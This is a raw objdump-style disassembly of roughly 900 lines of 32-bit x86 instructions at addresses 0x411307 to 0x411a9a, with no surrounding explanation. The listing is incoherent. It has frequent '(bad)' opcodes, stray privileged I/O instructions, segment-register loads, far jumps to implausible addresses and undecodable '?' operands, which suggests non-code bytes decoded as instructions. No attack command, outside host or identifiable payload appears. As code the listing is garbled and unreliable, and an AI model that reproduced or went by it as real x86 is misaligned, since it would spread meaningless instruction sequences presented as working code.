  411307:	push   ebx
  411308:	xchg   edx,eax
  411309:	push   esp
  41130a:	mov    esi,0x431a4309
  41130f:	xor    eax,0x72d550c7
  411314:	xchg   bp,ax
  411316:	aad    0x47
  411318:	pop    ecx
  411319:	aam    0x43
  41131b:	inc    edi
  41131c:	daa    
  41131d:	ds mov ch,0xf9
  411320:	xchg   DWORD PTR [ecx],eax
  411322:	(bad)  
  411324:	fadd   QWORD PTR [esi-0x7f]
  411327:	cmp    dl,bh
  411329:	mov    eax,ds:0x6fc652f2
  41132e:	in     al,dx
  41132f:	mov    esp,ds
  411331:	pop    ecx
  411332:	out    dx,al
  411333:	lahf   
  411334:	or     ebp,DWORD PTR [edx]
  411336:	jbe    0x41138f
  411338:	ins    BYTE PTR es:[edi],dx
  411339:	mov    cl,BYTE PTR [ecx]
  41133b:	out    dx,al
  41133c:	xlat   BYTE PTR ds:[ebx]
  41133d:	xchg   ebp,eax
  41133e:	leave  
  41133f:	(bad)  
  411340:	jmp    0x41131c
  411342:	rol    BYTE PTR [ebp-0x2695c637],0xe
  411349:	inc    ecx
  41134a:	adc    DWORD PTR [esi+0x2499212a],edx
  411350:	das    
  411351:	xchg   esi,eax
  411352:	pop    eax
  411353:	(bad)  [ebx]
  411355:	cs mov edi,0x19c2a99c
  41135b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41135c:	daa    
  41135d:	sbb    eax,0x3c09e35e
  411362:	mov    bl,0xa3
  411364:	js     0x411313
  411366:	fild   WORD PTR [edx]
  411368:	ret    0xd08b
  41136b:	daa    
  41136c:	(bad)  
  41136d:	xor    BYTE PTR [ecx+0x68],cl
  411370:	or     bh,BYTE PTR [ecx]
  411372:	ss in  eax,dx
  411374:	xchg   BYTE PTR ds:0xb2ac751a,dh
  41137a:	fndisi(8087 only) 
  41137c:	mov    WORD PTR [edi+edx*8],ss
  41137f:	push   cs
  411380:	lods   eax,DWORD PTR ds:[esi]
  411381:	dec    esp
  411382:	fcom   DWORD PTR [esi+edi*8+0x5c4e8a93]
  411389:	cmp    edx,esp
  41138b:	loopne 0x41133f
  41138d:	mov    bl,0x22
  41138f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411390:	adc    ah,BYTE PTR [eax+0xe03f1cb]
  411396:	or     ch,BYTE PTR [esi+0xc7ee2ff]
  41139c:	das    
  41139d:	das    
  41139e:	shr    DWORD PTR [esi-0x38e56979],cl
  4113a4:	call   0x491d:0x7f73c84b
  4113ab:	dec    esp
  4113ac:	add    esp,edx
  4113ae:	or     BYTE PTR ds:0x46cfce0b,al
  4113b4:	nop
  4113b5:	sar    BYTE PTR [ebx-0x173b1778],0x14
  4113bc:	scas   al,BYTE PTR es:[edi]
  4113bd:	ss nop
  4113bf:	xlat   BYTE PTR ds:[ebx]
  4113c0:	mov    cl,0x3d
  4113c2:	push   ebx
  4113c3:	mov    ebx,0x64b6a19
  4113c8:	fld    DWORD PTR [ecx-0x30776b83]
  4113ce:	cmp    dh,dh
  4113d0:	aad    0x97
  4113d2:	sbb    BYTE PTR ds:0x5410ed48,dh
  4113d8:	jae    0x4113e0
  4113da:	shl    dh,1
  4113dc:	mov    al,0xe7
  4113de:	jmp    0x4113ee
  4113e0:	push   ds
  4113e1:	pushf  
  4113e2:	mov    fs,WORD PTR ds:0x66ebbaeb
  4113e8:	xchg   ebp,eax
  4113e9:	popa   
  4113ea:	push   edi
  4113eb:	cmp    esp,DWORD PTR [esi+0x3e]
  4113ee:	sti    
  4113ef:	mov    eax,0xc601e4c3
  4113f4:	adc    al,0xcf
  4113f6:	ss int3 
  4113f8:	shr    DWORD PTR fs:[ebx-0x6ff3aa46],1
  4113ff:	jecxz  0x411400
  411401:	add    DWORD PTR [ebp+0x59],esp
  411404:	div    BYTE PTR [esi-0x33d83a1a]
  41140a:	addr16 dec eax
  41140c:	aaa    
  41140d:	out    0x59,al
  41140f:	add    DWORD PTR [ecx-0x17],edx
  411412:	dec    ecx
  411413:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411414:	dec    eax
  411415:	into   
  411416:	pop    ebx
  411417:	jecxz  0x4113b3
  411419:	pop    esi
  41141a:	ds aas 
  41141c:	inc    eax
  41141d:	and    esp,ebp
  41141f:	pop    eax
  411420:	xor    BYTE PTR [ebp+0x6f],al
  411423:	inc    ecx
  411424:	(bad)  
  411425:	(bad)  [ebp+0x505dd3e5]
  41142b:	adc    eax,DWORD PTR [edx]
  41142d:	(bad)  [edx+ebp*1+0x8]
  411431:	imul   edi,DWORD PTR [edi-0x9],0xdd17e77c
  411438:	xor    DWORD PTR [ecx+edx*8-0x5b7f9ecb],0x2f
  411440:	mov    ds:0x86d273db,eax
  411445:	aas    
  411446:	cs js  0x411448
  411449:	mov    eax,0xf52391e9
  41144e:	push   edx
  41144f:	cli    
  411450:	push   0xffffffe2
  411452:	add    DWORD PTR [ebx-0x44],ebp
  411455:	(bad)  
  411456:	mov    dh,0xac
  411458:	mov    DWORD PTR [eax+eiz*8-0x59],esi
  41145c:	cdq    
  41145d:	mov    dl,0x68
  41145f:	push   edi
  411460:	aaa    
  411461:	xchg   esp,eax
  411462:	push   eax
  411463:	retf   0x8718
  411466:	loopne 0x411492
  411468:	xor    esp,esi
  41146a:	rcl    bh,cl
  41146c:	gs jg  0x411488
  41146f:	xor    BYTE PTR [edx-0x6866e6f8],0xa5
  411476:	pop    esi
  411477:	xlat   BYTE PTR ds:[ebx]
  411478:	fsub   st,st(5)
  41147a:	push   edi
  41147b:	mov    ch,0x5a
  41147d:	sub    DWORD PTR [ebx],esp
  41147f:	ret    0x460d
  411482:	test   eax,0x3066995e
  411487:	loope  0x411482
  411489:	push   ds
  41148a:	ficomp DWORD PTR [ebx+0x15]
  41148d:	pop    edi
  41148e:	data16 je 0x4114e6
  411491:	sbb    BYTE PTR [esi+edx*8-0x255696ad],ah
  411498:	dec    edx
  411499:	call   edi
  41149b:	dec    esi
  41149c:	mov    dh,0xb
  41149e:	inc    ebx
  41149f:	jle    0x41147c
  4114a1:	fisub  DWORD PTR [ecx-0x18]
  4114a4:	int3   
  4114a5:	in     eax,0xd7
  4114a7:	inc    esi
  4114a8:	add    al,dh
  4114aa:	xor    DWORD PTR [eax+ebp*4+0x27b26aa7],0xffffffcd
  4114b2:	adc    eax,ebp
  4114b4:	pop    ecx
  4114b5:	mul    DWORD PTR [ebp+0x78]
  4114b8:	and    bh,dh
  4114ba:	and    edi,ebp
  4114bc:	xchg   esi,eax
  4114bd:	stos   BYTE PTR es:[edi],al
  4114be:	iret   
  4114bf:	pop    ds
  4114c0:	xchg   esp,eax
  4114c1:	dec    edx
  4114c2:	mov    al,ds:0xd08fdd9c
  4114c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114c8:	out    0x85,al
  4114ca:	jge    0x411521
  4114cc:	xor    eax,0x28fa978c
  4114d1:	daa    
  4114d2:	mov    esi,edi
  4114d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114d5:	push   eax
  4114d6:	mov    al,0x54
  4114d8:	ss jecxz 0x41146f
  4114db:	jle    0x41154e
  4114dd:	(bad)  
  4114e0:	push   es
  4114e1:	jno    0x411505
  4114e3:	inc    edx
  4114e4:	mov    cl,BYTE PTR [edi+0x2aeede56]
  4114ea:	add    edx,DWORD PTR [esi+0x4c]
  4114ed:	(bad)  
  4114ee:	mov    eax,0x89635d01
  4114f3:	sub    BYTE PTR [edx-0x19833242],dl
  4114f9:	mov    ds:0xda3e465b,eax
  4114fe:	loope  0x411491
  411500:	sub    DWORD PTR [edx],edx
  411502:	xor    edx,DWORD PTR ds:0xd4c7f5d4
  411508:	xchg   edx,eax
  411509:	int    0x5
  41150b:	xchg   esp,eax
  41150c:	cld    
  41150d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41150e:	xor    DWORD PTR [ecx],eax
  411510:	into   
  411511:	jmp    0x5b8a:0x11801a58
  411518:	int3   
  411519:	shr    DWORD PTR [edx],cl
  41151b:	and    eax,0x1aa6e844
  411520:	lahf   
  411521:	jp     0x411544
  411523:	scas   eax,DWORD PTR es:[edi]
  411524:	push   ebp
  411525:	cmc    
  411526:	xor    BYTE PTR [edi+0x7005313e],ch
  41152c:	sub    ah,ch
  41152e:	mov    ds,ebx
  411530:	(bad)  
  411531:	imul   esi,DWORD PTR [ebp+0x47f2b780],0xffffffb2
  411538:	sahf   
  411539:	sub    BYTE PTR [ecx],al
  41153b:	(bad)  
  41153d:	inc    esp
  41153e:	fwait
  41153f:	mov    ds,WORD PTR [esi+ebx*1-0x4d]
  411543:	dec    ebp
  411544:	popf   
  411545:	sub    eax,0x513b46df
  41154a:	adc    ebx,esp
  41154c:	call   0xf42982a5
  411551:	xor    BYTE PTR [eax],cl
  411553:	xchg   esi,esi
  411555:	push   ss
  411556:	pop    edx
  411557:	jecxz  0x4114e5
  411559:	(bad)  
  41155a:	out    0xff,eax
  41155c:	jle    0x4115d3
  41155e:	ss pop edi
  411560:	push   esp
  411561:	cmp    eax,0xb2b5da15
  411566:	add    bl,ch
  411568:	in     al,0x5d
  41156a:	int    0xce
  41156c:	sbb    BYTE PTR [ecx-0x6a],0x1f
  411570:	rcr    edi,cl
  411572:	popa   
  411573:	push   eax
  411574:	push   ebx
  411575:	inc    esp
  411576:	add    BYTE PTR [edx],ah
  411578:	call   0xf4312b6
  41157d:	js     0x411575
  41157f:	sbb    eax,0x2268a3c0
  411584:	fiadd  DWORD PTR [edx]
  411586:	xor    BYTE PTR [ebp+0xa],al
  411589:	imul   edi,ecx,0x43e43571
  41158f:	hlt    
  411590:	(bad)  [eax]
  411592:	stos   BYTE PTR es:[edi],al
  411593:	or     cl,BYTE PTR [edi+0x5c95277c]
  411599:	fisubr WORD PTR [esi]
  41159b:	mov    ds:0x98515796,al
  4115a0:	out    dx,al
  4115a1:	rol    BYTE PTR [edi+0x56],1
  4115a4:	call   0xa752e006
  4115a9:	(bad)  
  4115ab:	(bad)  
  4115ad:	and    al,0xee
  4115af:	rcr    esp,1
  4115b1:	jb     0x411565
  4115b3:	call   FWORD PTR [edx+eiz*8+0x10]
  4115b7:	jmp    0x4115fd
  4115b9:	jp     0x411632
  4115bb:	adc    al,0xdf
  4115bd:	mov    BYTE PTR [edi+0x33548be4],dl
  4115c3:	mov    dh,0x8e
  4115c5:	in     al,0xef
  4115c7:	sub    DWORD PTR [ecx],0x53df2727
  4115cd:	dec    ebx
  4115ce:	pop    es
  4115cf:	sbb    edi,DWORD PTR [ecx-0x27]
  4115d2:	out    dx,al
  4115d3:	sbb    BYTE PTR [ebp+0xe],ch
  4115d6:	adc    DWORD PTR [esi+esi*4],0x1d
  4115da:	outs   dx,DWORD PTR ds:[esi]
  4115db:	imul   edi,DWORD PTR ds:0x13618d6,0x2991cba
  4115e5:	xchg   BYTE PTR [edi+0x28],al
  4115e8:	xchg   esp,eax
  4115e9:	sar    DWORD PTR [esi],1
  4115eb:	push   ds
  4115ec:	or     al,0xeb
  4115ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115ef:	gs cwde 
  4115f1:	stc    
  4115f2:	dec    ecx
  4115f3:	dec    edi
  4115f4:	scas   al,BYTE PTR es:[edi]
  4115f5:	outs   dx,BYTE PTR ds:[esi]
  4115f6:	cdq    
  4115f7:	out    dx,eax
  4115f8:	stos   BYTE PTR es:[edi],al
  4115f9:	mov    esi,0x79a3119f
  4115fe:	enter  0xe75a,0xc3
  411602:	mov    ds:0xd4738c0,eax
  411607:	pop    ds
  411608:	jns    0x4115a8
  41160a:	scas   al,BYTE PTR es:[edi]
  41160b:	test   eax,0xe58d53f5
  411610:	push   ds
  411611:	mov    BYTE PTR [esi-0x80],ch
  411614:	mov    bh,0x5b
  411616:	mov    cl,0x2f
  411618:	jmp    0x20116d20
  41161d:	xor    BYTE PTR [edx-0x8],0xea
  411621:	sbb    DWORD PTR [esi+0x59],eax
  411624:	repnz or DWORD PTR ds:0x37852062,eax
  41162b:	adc    BYTE PTR [esi+0x1523933d],cl
  411631:	dec    ebx
  411632:	popa   
  411633:	xchg   bl,dh
  411635:	mov    cl,0x6c
  411637:	retf   0xa0e5
  41163a:	loopne 0x411606
  41163c:	popf   
  41163d:	push   ebp
  41163e:	(bad)  
  41163f:	fcomp  st(4)
  411641:	or     edx,eax
  411643:	push   edi
  411644:	or     DWORD PTR [ebx],esp
  411646:	xchg   esp,eax
  411647:	cwde   
  411648:	fld    DWORD PTR [eax+0x584d58d]
  41164e:	xor    DWORD PTR [ecx],ebx
  411650:	sub    eax,0x234a1e15
  411655:	mov    edx,0xf1fdf73a
  41165a:	fistp  DWORD PTR [edi]
  41165c:	arpl   ax,bx
  41165e:	out    0xd8,al
  411660:	call   0x9bd70bf2
  411665:	sub    ebp,DWORD PTR [edi]
  411667:	pop    es
  411668:	pop    ds
  411669:	retf   
  41166a:	retf   0x5cd5
  41166d:	cwde   
  41166e:	ret    
  41166f:	or     eax,0x10eb483d
  411674:	inc    esp
  411675:	sbb    DWORD PTR [eax+0x4c],esi
  411678:	push   esp
  411679:	in     al,dx
  41167a:	or     ecx,esp
  41167c:	xchg   edx,eax
  41167d:	je     0x41168f
  41167f:	xchg   BYTE PTR [ebx],ch
  411681:	xchg   edx,eax
  411682:	jae    0x4116ab
  411684:	xchg   edi,eax
  411685:	in     al,0xe0
  411687:	js     0x4116cf
  411689:	test   al,0x80
  41168b:	loope  0x4116b3
  41168d:	xchg   BYTE PTR [edx-0x80],ah
  411690:	gs push esi
  411692:	xchg   esp,eax
  411693:	(bad)  
  411694:	sub    dh,ch
  411696:	or     cl,BYTE PTR [esi]
  411698:	cld    
  411699:	sub    DWORD PTR [eax],esi
  41169b:	dec    esi
  41169c:	jo     0x41164e
  41169e:	leave  
  41169f:	dec    esi
  4116a0:	push   ebx
  4116a1:	scas   al,BYTE PTR es:[edi]
  4116a2:	and    BYTE PTR [edi],ch
  4116a4:	popf   
  4116a5:	inc    edi
  4116a6:	addr16 in al,0xa2
  4116a9:	clc    
  4116aa:	push   ds
  4116ab:	adc    edi,DWORD PTR [esi-0x4e]
  4116ae:	popf   
  4116af:	pop    ebx
  4116b0:	loope  0x411677
  4116b2:	aam    0xe8
  4116b4:	bound  eax,QWORD PTR [eax+0x4d]
  4116b7:	xchg   edx,eax
  4116b8:	xchg   edx,eax
  4116b9:	add    BYTE PTR [edi+0x690d03fc],cl
  4116bf:	mov    ah,0xea
  4116c1:	push   edi
  4116c2:	sub    DWORD PTR [eax+0x68],0x20
  4116c6:	push   0xd7f16a58
  4116cb:	dec    dh
  4116cd:	out    0x9b,eax
  4116cf:	and    DWORD PTR [esi],0x8f6900ca
  4116d5:	add    BYTE PTR [eax+0x2e],dh
  4116d8:	adc    al,0xd3
  4116da:	test   DWORD PTR [eax],ebx
  4116dc:	add    DWORD PTR [esi+0x14],esi
  4116df:	sbb    ecx,ebp
  4116e1:	aaa    
  4116e2:	rol    BYTE PTR [esi],1
  4116e4:	pusha  
  4116e5:	fdivr  QWORD PTR [ecx]
  4116e7:	push   0x1b73037c
  4116ec:	pop    ecx
  4116ed:	retf   0xb642
  4116f0:	push   ds
  4116f1:	push   ecx
  4116f2:	test   al,0xcf
  4116f4:	lods   al,BYTE PTR ds:[esi]
  4116f5:	ins    BYTE PTR es:[edi],dx
  4116f6:	cmp    cl,ah
  4116f8:	leave  
  4116f9:	pop    ss
  4116fa:	dec    edx
  4116fb:	aaa    
  4116fc:	and    edx,ecx
  4116fe:	test   eax,0x5116f12c
  411703:	and    ah,dl
  411705:	mov    dl,0xbf
  411707:	daa    
  411708:	jae    0x411739
  41170a:	jno    0x411784
  41170c:	popa   
  41170d:	mov    ebp,0x64242376
  411712:	fwait
  411713:	push   esp
  411714:	rcl    DWORD PTR [edi],1
  411716:	jg     0x411717
  411718:	sahf   
  411719:	mov    WORD PTR [edx-0x440f476e],cs
  41171f:	clc    
  411720:	inc    edx
  411721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411722:	xchg   DWORD PTR [ecx-0x69],eax
  411725:	mov    fs,eax
  411727:	mov    bh,BYTE PTR [esi]
  411729:	shl    BYTE PTR ss:[edx],cl
  41172c:	mov    BYTE PTR [edi],ah
  41172e:	add    cl,BYTE PTR [edi-0x1c]
  411731:	mov    bl,0x8b
  411733:	push   ebx
  411734:	inc    ebx
  411735:	ss mov ebx,0x506d1466
  41173b:	retf   0x2d2e
  41173e:	mov    al,ds:0x897bffdc
  411743:	inc    edx
  411744:	or     al,0xe
  411746:	pop    edi
  411747:	jmp    0x23fa:0xcdb6fc9d
  41174e:	jns    0x411717
  411750:	jb     0x411710
  411752:	xor    eax,0x70e4cd33
  411757:	fwait
  411758:	jb     0x4116fe
  41175a:	sub    cl,BYTE PTR [edx-0x1b]
  41175d:	mov    ecx,0x232c85cd
  411762:	adc    eax,0x539ea5ef
  411767:	xlat   BYTE PTR ds:[ebx]
  411768:	sbb    dh,BYTE PTR [edi+0x17]
  41176b:	nop
  41176c:	retf   0xd691
  41176f:	rcr    BYTE PTR [edx-0x4dc521b9],0x3c
  411776:	imul   edi,esp,0x1a0c1146
  41177c:	and    BYTE PTR [ecx-0x9],ch
  41177f:	popf   
  411780:	shr    BYTE PTR [eax-0xa],0x7a
  411784:	mov    al,ds:0x4d286be8
  411789:	sbb    eax,0xdc15de60
  41178e:	pop    ds
  41178f:	hlt    
  411790:	pop    es
  411791:	mov    WORD PTR [ebp+0x4ccc742a],?
  411797:	stos   BYTE PTR es:[edi],al
  411798:	push   esi
  411799:	mov    eax,0x619ed47
  41179e:	retf   
  41179f:	out    0x4e,al
  4117a1:	jmp    0x4117f2
  4117a3:	loopne 0x4117bc
  4117a5:	pop    edi
  4117a6:	fnstenv [ebx+0x56401fb9]
  4117ac:	fwait
  4117ad:	push   eax
  4117ae:	fldcw  WORD PTR [ecx+0x5c]
  4117b1:	pop    eax
  4117b2:	cld    
  4117b3:	pop    esi
  4117b4:	sub    edx,DWORD PTR [ecx]
  4117b6:	test   DWORD PTR [edx+ebp*8],0x6c6fce70
  4117bd:	and    DWORD PTR [eax+0x1d],esp
  4117c0:	cmp    edi,eax
  4117c2:	push   ebx
  4117c3:	cmc    
  4117c4:	mov    BYTE PTR [eax+0x2af5efd7],cl
  4117ca:	test   DWORD PTR [ecx],ebp
  4117cc:	jmp    0xa95:0xb58499f9
  4117d3:	jp     0x41178b
  4117d5:	mov    ?,WORD PTR [edx-0x41]
  4117d8:	xor    ebx,eax
  4117da:	jmp    0x4117a6
  4117dc:	jge    0x411805
  4117de:	ja     0x41182c
  4117e0:	xchg   esi,eax
  4117e1:	sbb    DWORD PTR [ecx-0x17beb5be],ecx
  4117e7:	or     BYTE PTR [esi-0xd],bl
  4117ea:	repz sub DWORD PTR [eiz*1-0x1d3134],edi
  4117f2:	outs   dx,DWORD PTR ds:[esi]
  4117f3:	stos   DWORD PTR es:[edi],eax
  4117f4:	test   al,0xe
  4117f6:	mov    cl,0xd
  4117f8:	imul   esi,DWORD PTR [ecx],0x9f4177f2
  4117fe:	push   cs
  4117ff:	jb     0x4117a1
  411801:	mov    ch,0x80
  411803:	js     0x411792
  411805:	inc    eax
  411806:	jns    0x411864
  411808:	push   ebx
  411809:	mov    dh,0xa0
  41180b:	jmp    FWORD PTR [eax]
  41180d:	xor    ebx,DWORD PTR [ecx-0x74077db0]
  411813:	pop    edi
  411814:	out    dx,eax
  411815:	lds    ecx,FWORD PTR [esi]
  411817:	mov    esi,0xb60eb7b
  41181c:	icebp  
  41181d:	mov    BYTE PTR [eax+0x54],cl
  411820:	mov    esp,0x2787470
  411825:	sahf   
  411826:	add    al,0x2b
  411828:	nop
  411829:	mov    dl,0x5
  41182b:	push   esp
  41182c:	xor    eax,0x5d9be44d
  411831:	add    BYTE PTR [eax-0x58],0xa4
  411835:	cmp    al,BYTE PTR [eax]
  411837:	cwde   
  411838:	(bad)  
  411839:	or     BYTE PTR [ebp+0x57],bh
  41183c:	lahf   
  41183d:	(bad)  
  41183e:	das    
  41183f:	loopne 0x4117fa
  411841:	add    BYTE PTR [ebx-0x535f2cb7],bl
  411847:	into   
  411848:	mov    ecx,0xa239ccd1
  41184d:	sub    esp,ebp
  41184f:	jle    0x411856
  411851:	in     al,dx
  411852:	int3   
  411853:	fmul   DWORD PTR [edx-0x21]
  411856:	cld    
  411857:	test   BYTE PTR [ebp-0x62],cl
  41185a:	sar    DWORD PTR [ecx+0x17],cl
  41185d:	adc    DWORD PTR [edx-0x5eb3ba72],ebp
  411863:	cmp    ch,ah
  411865:	inc    eax
  411866:	repz xchg dh,dl
  411869:	loopne 0x4118ba
  41186b:	gs adc al,0xc
  41186e:	inc    edx
  41186f:	sar    BYTE PTR [edx+0x13],0xba
  411873:	bound  ecx,QWORD PTR [ecx+0x49]
  411876:	adc    eax,0x6df780b4
  41187b:	xlat   BYTE PTR ds:[ebx]
  41187c:	and    ch,ch
  41187e:	div    BYTE PTR [ebx]
  411880:	add    esi,DWORD PTR [esi+0x40]
  411883:	(bad)  
  411884:	out    dx,eax
  411885:	adc    BYTE PTR [ebx+edi*8+0x32],dl
  411889:	ja     0x411893
  41188b:	inc    esp
  41188c:	push   0x25
  41188e:	add    al,0x4f
  411890:	int3   
  411891:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411892:	int3   
  411893:	xchg   esi,eax
  411894:	std    
  411895:	sub    al,0x9d
  411897:	inc    edi
  411898:	pop    eax
  411899:	mov    ebp,edi
  41189b:	pusha  
  41189c:	ins    BYTE PTR es:[edi],dx
  41189d:	xchg   bl,ch
  41189f:	cmp    ecx,edx
  4118a1:	mov    cl,BYTE PTR [edx+0x1ab87712]
  4118a7:	clc    
  4118a8:	mov    eax,ds:0x36d11326
  4118ad:	stos   BYTE PTR es:[edi],al
  4118ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118af:	and    al,0xf0
  4118b1:	mov    dh,0x41
  4118b3:	pop    ecx
  4118b4:	imul   ecx,edi,0xffffffeb
  4118b7:	int    0x3d
  4118b9:	in     eax,dx
  4118ba:	sbb    ch,bl
  4118bc:	aaa    
  4118bd:	div    BYTE PTR [edi]
  4118bf:	xor    DWORD PTR [ebx],edi
  4118c1:	sbb    edi,edx
  4118c3:	and    esp,DWORD PTR [esp+eax*4]
  4118c6:	sahf   
  4118c7:	push   0x28498e74
  4118cc:	dec    ebx
  4118cd:	test   ch,cl
  4118cf:	test   ch,0x66
  4118d2:	and    al,0x45
  4118d4:	add    eax,0x11decdbc
  4118d9:	rcl    BYTE PTR ss:[ebx-0x4e],0x3
  4118de:	push   ss
  4118df:	out    dx,al
  4118e0:	test   al,0xa2
  4118e2:	mov    ah,0xbd
  4118e4:	xor    BYTE PTR [edi+ebx*8+0x7b81475],bl
  4118eb:	jbe    0x411899
  4118ed:	adc    bh,BYTE PTR [edx]
  4118ef:	stos   BYTE PTR es:[edi],al
  4118f0:	xor    BYTE PTR ds:[edx-0x37c8f4f3],al
  4118f7:	clc    
  4118f8:	lea    ebx,[edx]
  4118fa:	int3   
  4118fb:	arpl   WORD PTR [edi-0x47],ax
  4118fe:	scas   al,BYTE PTR es:[edi]
  4118ff:	pusha  
  411900:	pop    esi
  411901:	ins    DWORD PTR es:[edi],dx
  411902:	add    ah,BYTE PTR [ebx+0xec1d53b]
  411908:	(bad)  
  411909:	and    eax,0xfc731fe9
  41190e:	repnz xlat BYTE PTR ds:[ebx]
  411910:	mov    BYTE PTR [ebx],dl
  411912:	mov    edx,0x98623f8d
  411917:	push   edx
  411918:	clc    
  411919:	sub    dl,BYTE PTR [eax-0x28]
  41191c:	fcmovbe st,st(0)
  41191e:	mov    eax,DWORD PTR [eax-0x419c1f8b]
  411924:	imul   edx,DWORD PTR ds:0x8c066eaf,0x56
  41192b:	push   ss
  41192c:	sub    al,0x40
  41192e:	xor    BYTE PTR [edx+0x7a],0x9
  411932:	das    
  411933:	xor    ah,cl
  411935:	pop    bx
  411937:	jnp    0x411929
  411939:	or     BYTE PTR [edx+0x3f],dl
  41193c:	sbb    DWORD PTR [ecx],ebx
  41193e:	push   ebp
  41193f:	jbe    0x4118f9
  411941:	jo     0x4118f6
  411943:	js     0x4119a3
  411945:	in     eax,0x8f
  411947:	jg     0x41199b
  411949:	cli    
  41194a:	fisttp QWORD PTR [esi+0x1e]
  41194d:	mov    ds:0x8da35438,eax
  411952:	and    eax,0xdc5da13e
  411957:	mov    ds:0xb7516dae,eax
  41195c:	adc    BYTE PTR [edx-0x2],dl
  41195f:	frstor [edi+0x3b53eca9]
  411965:	jns    0x411919
  411967:	adc    bl,al
  411969:	xor    BYTE PTR [edi+0x16],dl
  41196c:	push   es
  41196d:	sahf   
  41196e:	or     ch,BYTE PTR [ecx-0x3e51902b]
  411974:	xchg   BYTE PTR [esp+ecx*8],dl
  411977:	push   esi
  411978:	mov    gs,WORD PTR [edx]
  41197a:	mov    al,0x6b
  41197c:	aas    
  41197d:	mov    dl,0x23
  41197f:	shl    DWORD PTR [ecx-0x24dbb53e],cl
  411985:	jmp    0x411918
  411987:	sbb    DWORD PTR [esi],esi
  411989:	sbb    eax,0x4ec5c0f3
  41198e:	mov    al,ds:0x7d3ad5a5
  411993:	mov    al,0xe3
  411995:	loope  0x41196b
  411997:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411998:	mov    ?,WORD PTR [ebx+0xc00216c]
  41199e:	js     0x411939
  4119a0:	pushf  
  4119a1:	cs je  0x411958
  4119a4:	xchg   ebx,eax
  4119a5:	inc    esi
  4119a6:	lods   eax,DWORD PTR ds:[esi]
  4119a7:	xchg   ebx,eax
  4119a8:	scas   eax,DWORD PTR es:[edi]
  4119a9:	inc    edx
  4119aa:	scas   eax,DWORD PTR es:[edi]
  4119ab:	aaa    
  4119ac:	jmp    0x41195a
  4119ae:	jge    0x41193f
  4119b0:	call   0xe0a458ee
  4119b5:	pop    eax
  4119b6:	das    
  4119b7:	sti    
  4119b8:	mov    dl,0xe
  4119ba:	push   ebp
  4119bb:	bound  ebp,QWORD PTR [eax-0x7b]
  4119be:	and    BYTE PTR [eax],dh
  4119c0:	jg     0x411a30
  4119c2:	mov    esp,0x4415c9d3
  4119c7:	adc    DWORD PTR [ecx+ecx*1+0x71],0xffffffca
  4119cc:	fs popa 
  4119ce:	mov    edi,DWORD PTR ds:0x281a4dd7
  4119d4:	adc    eax,0xaa0e5e73
  4119d9:	mov    edx,0x2a9a9086
  4119de:	into   
  4119df:	rcl    BYTE PTR [edi-0x4b],0x35
  4119e3:	lock mov ebx,DWORD PTR [esi+0x359cd97a]
  4119ea:	cs pop es
  4119ec:	inc    edx
  4119ed:	fimul  DWORD PTR [ebx+0x7d]
  4119f0:	adc    BYTE PTR [edi-0xc],bh
  4119f3:	retf   
  4119f4:	cdq    
  4119f5:	sub    ebp,ecx
  4119f7:	ins    BYTE PTR es:[edi],dx
  4119f8:	lods   al,BYTE PTR ds:[esi]
  4119f9:	push   eax
  4119fa:	mov    ch,0xd1
  4119fc:	fisubr DWORD PTR [ebp+0x16]
  4119ff:	iret   
  411a00:	out    0x4f,eax
  411a02:	leave  
  411a03:	out    0x5e,eax
  411a05:	pop    esi
  411a06:	push   ecx
  411a07:	xor    bl,dh
  411a09:	jg     0x4119e7
  411a0b:	lock mov eax,0x316a94fd
  411a11:	mov    ah,0x44
  411a13:	(bad)  
  411a14:	push   edi
  411a15:	std    
  411a16:	pop    ebx
  411a17:	ins    DWORD PTR es:[edi],dx
  411a18:	xchg   ecx,eax
  411a19:	sbb    ebp,DWORD PTR [edx]
  411a1b:	jge    0x411a2e
  411a1d:	push   esp
  411a1e:	mov    ebx,0x3f5ecc2d
  411a23:	mov    bl,0x54
  411a25:	sbb    eax,0x7ded9170
  411a2a:	(bad)  
  411a2b:	in     al,0xef
  411a2d:	ror    DWORD PTR [esi-0x69e8f272],0x36
  411a34:	pop    ebp
  411a35:	test   BYTE PTR [ecx+0x41],cl
  411a38:	and    DWORD PTR ds:0xe731da10,0xffffffbc
  411a3f:	mov    bl,0x11
  411a41:	in     al,dx
  411a42:	sbb    DWORD PTR [ebx-0x35],eax
  411a45:	sub    al,0xa4
  411a47:	test   eax,0x14838da1
  411a4c:	icebp  
  411a4d:	mov    cl,0xcf
  411a4f:	jns    0x411aa6
  411a51:	pop    esi
  411a52:	pop    ss
  411a53:	lods   al,BYTE PTR ds:[esi]
  411a54:	sbb    DWORD PTR [eax-0x21],ebp
  411a57:	inc    eax
  411a58:	dec    edi
  411a59:	sbb    al,0xd2
  411a5b:	pop    es
  411a5c:	daa    
  411a5d:	test   DWORD PTR [ebp-0x18cc2f6e],esi
  411a63:	jo     0x411abe
  411a65:	inc    ebx
  411a66:	ins    BYTE PTR es:[edi],dx
  411a67:	xchg   edx,eax
  411a68:	mov    dl,0x50
  411a6a:	inc    esi
  411a6b:	jp     0x411a6d
  411a6d:	xchg   edi,eax
  411a6e:	nop
  411a6f:	punpckhdq mm4,QWORD PTR [edi+ebx*2-0xb]
  411a74:	mov    ds:0xc3213a28,eax
  411a79:	in     al,dx
  411a7a:	cmp    eax,0xf818dfec
  411a7f:	sti    
  411a80:	push   ecx
  411a81:	xchg   ecx,eax
  411a82:	xchg   edx,eax
  411a83:	sub    edi,DWORD PTR [ecx+0x39eb8d6a]
  411a89:	dec    ebp
  411a8a:	jle    0x411a88
  411a8c:	xchg   ecx,eax
  411a8d:	pushf  
  411a8e:	dec    esp
  411a8f:	sub    bh,dl
  411a91:	sbb    bl,BYTE PTR [ebp+0x27203ed8]
  411a97:	pop    ss
  411a98:	cmp    esp,esi
  411a9a:	fld    TBYTE PTR ds:0x27756fd9
